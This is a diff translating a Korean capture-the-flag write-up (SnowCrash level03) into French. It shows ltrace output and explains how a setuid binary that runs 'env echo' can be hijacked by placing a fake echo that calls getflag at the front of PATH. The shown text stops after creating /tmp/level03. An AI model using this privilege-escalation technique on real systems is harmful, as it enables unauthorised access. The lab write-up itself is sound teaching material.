@@ -1,6 +1,8 @@
 # Level03
 
-## 파일 찾기 및 실행
+</br></br>
+
+## Rechercher et exécuter le fichier
 
 ```zsh
 level03@SnowCrash:~$ ls -al
@@ -15,16 +17,17 @@ level03@SnowCrash:~$ ./level03
 Exploit me
 ```
 
-이 경우 s 권한이 있는 파일을 실행할 때는 이 파일이 소유한 권한으로 실행되므로 안에서 getflag를
-실행하면 flag03이 실행한것과 같다.
-즉, su flag03을 하기위해서 비밀번호를 찾지않아도된다.
+Dans ce cas, lors de l'exécution d'un fichier avec la permission s, il est exécuté avec la permission détenue par ce fichier, donc
+Lorsqu'il est exécuté, il est identique à flag03 exécuté.
+En d'autres termes, vous n'avez pas besoin de trouver le mot de passe pour faire su flag03.
+
+</br></br>
 
 ## ltrace
 
-ltrace는 Linux에서 사용할 수 있는 명령어 중 하나입니다. 함수가 아니라 프로그램입니다.
+ltrace est l'une des commandes disponibles sous Linux. C'est un programme, pas une fonction.
 
-ltrace는 실행파일이 호출하는 라이브러리 함수들의 동작을 추적하여 출력해주는 도구입니다. 따라서 실행파일 내부의 함수 호출과 매개변수, 반환값 등을 추적하여 디버깅이나 분석에 사용될 수 있습니다.
-
+ltrace est un outil qui trace et affiche le comportement des fonctions de la bibliothèque appelées par un fichier exécutable. Par conséquent, il peut être utilisé pour le débogage ou l'analyse en traçant les appels de fonction, les paramètres et les valeurs de retour dans un fichier exécutable.
 ```zsh
 level03@SnowCrash:~$ ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
@@ -39,12 +42,17 @@ system("/usr/bin/env echo Exploit me"Exploit me
 +++ exited (status 0) +++
 ```
 
+</br></br>
+
 ## /usr/bin/env
 
-/usr/bin/env는 유닉스 및 리눅스에서 사용되는 명령어로, 실행할 프로그램의 경로를 환경변수로부터 찾아 실행합니다.
-즉, echo를 내가 따로 설정할수있다.
 
-즉, echo안에 getflag를 넣어서 실행시키면된다.
+/usr/bin/env est une commande utilisée sous Unix et Linux, et trouve le chemin du programme à exécuter à partir des variables d'environnement et l'exécute.
+En d'autres termes, je peux régler l'écho séparément.
+
+En d'autres termes, mettez getflag dans echo et exécutez-le.
+
+</br></br>
 
 ## getflag
 
@@ -53,7 +61,9 @@ level03@SnowCrash:~$ whereis getflag
 getflag: /bin/getflag
 ```
 
-## echo 파일 만들기 및 PATH의 맨앞에 경로 저장
+</br></br>
+
+##  Créez un fichier écho et placez le chemin devant PATH
 
 ```zsh
 level03@SnowCrash:~$ mkdir /tmp/level03
